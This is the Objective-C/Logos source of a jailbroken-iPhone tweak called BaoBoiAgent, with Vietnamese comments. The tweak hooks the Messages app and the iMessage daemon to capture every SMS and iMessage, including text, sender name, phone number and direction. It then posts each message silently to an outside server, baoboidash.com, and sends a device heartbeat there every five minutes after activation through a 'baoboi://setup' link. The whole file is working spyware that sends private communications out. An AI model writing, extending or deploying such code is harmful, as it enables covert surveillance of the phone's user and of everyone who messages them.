// BaoBoiAgent Tweak - v1.4.2
// SpringBoard: CHỈ URL scheme setup + heartbeat (KHÔNG hook bất kỳ class nào)
// MobileSMS: hook CKMessagesController để bắt SMS
// imagent: hook CKConversation để bắt iMessage

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>

// ─── Cấu hình ────────────────────────────────────────────────────────────────
static NSString *const kServerURL = @"https://baoboidash.com/api/trpc/device.log";
static NSString *const kDeviceTokenKey = @"BaoBoiDeviceToken";

// Lấy deviceToken
static NSString *getDeviceToken() {
    NSUserDefaults *suite = [[NSUserDefaults alloc] initWithSuiteName:@"com.baoboi.agent"];
    NSString *token = [suite stringForKey:kDeviceTokenKey];
    if (!token || token.length == 0) {
        token = [[NSUserDefaults standardUserDefaults] stringForKey:kDeviceTokenKey];
    }
    return token ?: @"";
}

// Lưu deviceToken
static void saveDeviceToken(NSString *token) {
    NSUserDefaults *suite = [[NSUserDefaults alloc] initWithSuiteName:@"com.baoboi.agent"];
    [suite setObject:token forKey:kDeviceTokenKey];
    [suite synchronize];
    [[NSUserDefaults standardUserDefaults] setObject:token forKey:kDeviceTokenKey];
    [[NSUserDefaults standardUserDefaults] synchronize];
}

// Gửi POST lên server (background)
static void sendToServer(NSDictionary *payload) {
    NSString *token = getDeviceToken();
    if (token.length == 0) return;

    NSMutableDictionary *body = [payload mutableCopy];
    body[@"deviceToken"] = token;

    NSError *error = nil;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:@{ @"json": body }
                                                      options:0
                                                        error:&error];
    if (!jsonData || error) return;

    NSURL *url = [NSURL URLWithString:kServerURL];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    req.HTTPBody = jsonData;
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    req.timeoutInterval = 10;

    [[[NSURLSession sharedSession] dataTaskWithRequest:req
                                    completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {}]
     resume];
}

// Gửi heartbeat
static void sendHeartbeat() {
    @try {
        UIDevice *dev = [UIDevice currentDevice];
        sendToServer(@{
            @"event": @"device_online",
            @"deviceName": dev.name ?: @"iPhone",
            @"systemVersion": dev.systemVersion ?: @"",
            @"model": dev.model ?: @"iPhone",
        });
    } @catch (...) {}
}

// Gửi tin nhắn
static void sendMessageEvent(NSString *text, NSString *senderName, NSString *senderPhone,
                              NSString *platform, BOOL isIncoming, long long sentAtMs) {
    if (text.length == 0) return;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        sendToServer(@{
            @"event": @"new_message",
            @"msgContent": text,
            @"msgSenderName": senderName ?: @"",
            @"msgSenderPhone": senderPhone ?: @"",
            @"msgPlatform": platform ?: @"sms",
            @"msgIsIncoming": @(isIncoming),
            @"msgSentAt": @(sentAtMs),
        });
    });
}

// ─── SpringBoard: CHỈ hook SpringBoard class để xử lý URL scheme ─────────────
// KHÔNG hook NCNotificationRequest hay bất kỳ class nào khác
%group SpringBoardHooks

%hook SpringBoard

- (void)applicationOpenURL:(NSURL *)url {
    if (url && [[url scheme] isEqualToString:@"baoboi"]) {
        if ([[url host] isEqualToString:@"setup"]) {
            NSURLComponents *comps = [NSURLComponents componentsWithURL:url
                                                 resolvingAgainstBaseURL:NO];
            NSString *token = nil;
            for (NSURLQueryItem *item in comps.queryItems) {
                if ([item.name isEqualToString:@"token"]) {
                    token = item.value;
                    break;
                }
            }

            if (token.length > 0) {
                saveDeviceToken(token);

                dispatch_async(dispatch_get_main_queue(), ^{
                    @try {
                        UIAlertController *alert = [UIAlertController
                            alertControllerWithTitle:@"✅ Bảo Bối Đã Kích Hoạt"
                            message:@"Thiết bị đã được kết nối thành công."
                            preferredStyle:UIAlertControllerStyleAlert];
                        [alert addAction:[UIAlertAction actionWithTitle:@"OK"
                                                                  style:UIAlertActionStyleDefault
                                                                handler:nil]];
                        UIViewController *rootVC = nil;
                        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
                            if ([scene isKindOfClass:[UIWindowScene class]]) {
                                UIWindowScene *ws = (UIWindowScene *)scene;
                                if (ws.activationState == UISceneActivationStateForegroundActive) {
                                    for (UIWindow *w in ws.windows) {
                                        if (w.isKeyWindow) { rootVC = w.rootViewController; break; }
                                    }
                                }
                            }
                            if (rootVC) break;
                        }
                        if (!rootVC) {
                            rootVC = [UIApplication sharedApplication].windows.firstObject.rootViewController;
                        }
                        if (rootVC) {
                            [rootVC presentViewController:alert animated:YES completion:nil];
                        }
                    } @catch (...) {}
                });

                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC),
                               dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
                    sendHeartbeat();
                });
            }
            return;
        }
    }
    %orig;
}

%end // SpringBoard

%end // SpringBoardHooks

// ─── MobileSMS: hook bắt tin nhắn SMS ────────────────────────────────────────
%group MobileSMSHooks

%hook CKMessagesController

- (void)conversationList:(id)list didReceiveMessages:(NSArray *)messages {
    %orig;
    @try {
        for (id message in messages) {
            NSString *text = @"";
            NSString *senderHandle = @"";
            NSString *senderName = @"";
            BOOL isIncoming = YES;
            long long sentTime = (long long)([[NSDate date] timeIntervalSince1970] * 1000);

            if ([message respondsToSelector:@selector(text)])
                text = [message performSelector:@selector(text)] ?: @"";
            if ([message respondsToSelector:@selector(sender)]) {
                id sender = [message performSelector:@selector(sender)];
                if ([sender respondsToSelector:@selector(ID)])
                    senderHandle = [sender performSelector:@selector(ID)] ?: @"";
                if ([sender respondsToSelector:@selector(name)])
                    senderName = [sender performSelector:@selector(name)] ?: @"";
            }
            if ([message respondsToSelector:@selector(isFromMe)])
                isIncoming = ![[message performSelector:@selector(isFromMe)] boolValue];
            if ([message respondsToSelector:@selector(time)]) {
                id t = [message performSelector:@selector(time)];
                if ([t isKindOfClass:[NSDate class]])
                    sentTime = (long long)([(NSDate *)t timeIntervalSince1970] * 1000);
            }

            sendMessageEvent(text,
                             senderName.length > 0 ? senderName : senderHandle,
                             senderHandle, @"sms", isIncoming, sentTime);
        }
    } @catch (...) {}
}

%end // CKMessagesController

%end // MobileSMSHooks

// ─── imagent: hook bắt iMessage ──────────────────────────────────────────────
%group ImagentHooks

%hook CKConversation

- (void)_handleIncomingMessage:(id)message {
    %orig;
    @try {
        NSString *text = @"";
        NSString *senderHandle = @"";
        NSString *senderName = @"";
        BOOL isIncoming = YES;
        long long sentTime = (long long)([[NSDate date] timeIntervalSince1970] * 1000);
        NSString *platform = @"imessage";

        if ([message respondsToSelector:@selector(text)])
            text = [message performSelector:@selector(text)] ?: @"";
        if ([message respondsToSelector:@selector(sender)]) {
            id sender = [message performSelector:@selector(sender)];
            if ([sender respondsToSelector:@selector(ID)])
                senderHandle = [sender performSelector:@selector(ID)] ?: @"";
            if ([sender respondsToSelector:@selector(name)])
                senderName = [sender performSelector:@selector(name)] ?: @"";
        }
        if ([message respondsToSelector:@selector(isFromMe)])
            isIncoming = ![[message performSelector:@selector(isFromMe)] boolValue];
        if ([message respondsToSelector:@selector(time)]) {
            id t = [message performSelector:@selector(time)];
            if ([t isKindOfClass:[NSDate class]])
                sentTime = (long long)([(NSDate *)t timeIntervalSince1970] * 1000);
        }
        if ([message respondsToSelector:@selector(service)]) {
            id svc = [message performSelector:@selector(service)];
            if ([svc respondsToSelector:@selector(name)]) {
                NSString *svcName = [svc performSelector:@selector(name)] ?: @"";
                if ([svcName containsString:@"SMS"] || [svcName containsString:@"MMS"])
                    platform = @"sms";
            }
        }

        sendMessageEvent(text,
                         senderName.length > 0 ? senderName : senderHandle,
                         senderHandle, platform, isIncoming, sentTime);
    } @catch (...) {}
}

%end // CKConversation

%end // ImagentHooks

// ─── Constructor: khởi tạo đúng group theo process ───────────────────────────
%ctor {
    NSString *proc = [[NSProcessInfo processInfo] processName];

    if ([proc isEqualToString:@"SpringBoard"]) {
        %init(SpringBoardHooks);

        // Heartbeat định kỳ mỗi 5 phút
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC),
                       dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
            sendHeartbeat();
        });

        dispatch_source_t timer = dispatch_source_create(
            DISPATCH_SOURCE_TYPE_TIMER, 0, 0,
            dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0));
        dispatch_source_set_timer(timer,
            dispatch_time(DISPATCH_TIME_NOW, 5 * 60 * NSEC_PER_SEC),
            5 * 60 * NSEC_PER_SEC, 30 * NSEC_PER_SEC);
        dispatch_source_set_event_handler(timer, ^{ sendHeartbeat(); });
        dispatch_resume(timer);

    } else if ([proc isEqualToString:@"MobileSMS"]) {
        %init(MobileSMSHooks);

    } else if ([proc isEqualToString:@"imagent"]) {
        %init(ImagentHooks);
    }
    // Không làm gì với process khác
}
